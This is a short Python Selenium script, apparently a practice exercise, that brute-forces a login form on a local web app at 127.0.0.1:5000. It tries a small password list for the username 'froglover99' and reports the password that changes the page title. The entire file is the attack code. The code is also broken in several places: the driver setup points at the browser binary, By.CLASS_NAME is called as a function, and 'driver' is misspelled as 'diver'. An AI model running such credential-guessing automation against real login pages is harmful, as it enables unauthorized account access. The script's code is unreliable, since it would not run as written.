# brute force und aus github shit rausziehen // hydra, selenium, burp
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By


s = Service(executable_path="/usr/bin/firefox")

driver = webdriver.Firefox(service=s)

website = "http://127.0.0.1:5000/login"

driver.get(website)

titles=""

passwords = ["1234", "pass", "test"]

i = 0

for password in passwords:
    print("Testing this password: ", password)
    
    res = driver.find_elements(By.CLASS_NAME, value="Form-control")
    #assert(len(res) == 2)
    res[0].clear()
    res[0].send_keys("froglover99")
    res[1].clear()
    res[1].send_keys(password)

    button = driver.find_elements(By.CLASS_NAME("btn"))
    #assert?!
    button[0].click()

    print(diver.title)

    if driver.title != "Login":
        print(f"Password is {password}")
